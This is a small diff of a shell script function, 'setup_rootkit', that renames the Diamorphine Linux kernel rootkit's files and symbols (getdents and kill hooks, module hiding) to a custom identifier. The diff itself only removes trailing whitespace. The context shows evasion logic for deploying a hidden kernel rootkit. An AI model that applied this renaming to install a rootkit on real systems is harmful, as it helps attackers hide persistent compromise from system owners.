@@ -138,7 +138,7 @@ setup_rootkit() {
 	# Files
 	mv ${rk_path}/diamorphine.c ${rk_path}/${identifier}.c
 	mv ${rk_path}/diamorphine.h ${rk_path}/${identifier}.h
-	
+
 	# Module Information
 	sed -i s/m0nad/${identifier}/g ${rk_path}/${identifier}.c
 	sed -i -E "s/(MODULE_DESCRIPTION\\(\")[^\"]*(\"\\);)/\1${identifier}\2/" "${rk_path}/${identifier}.c"
@@ -150,12 +150,12 @@ setup_rootkit() {
 	sed -i s/diamorphine_init/${identifier}_init/g ${rk_path}/${identifier}.c
 	sed -i s/diamorphine_cleanup/${identifier}_cleanup/g ${rk_path}/${identifier}.c
 	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
-	
+
 	# Original functions
 	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
 	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
-	
+
 	# Hooks
 	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
 	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
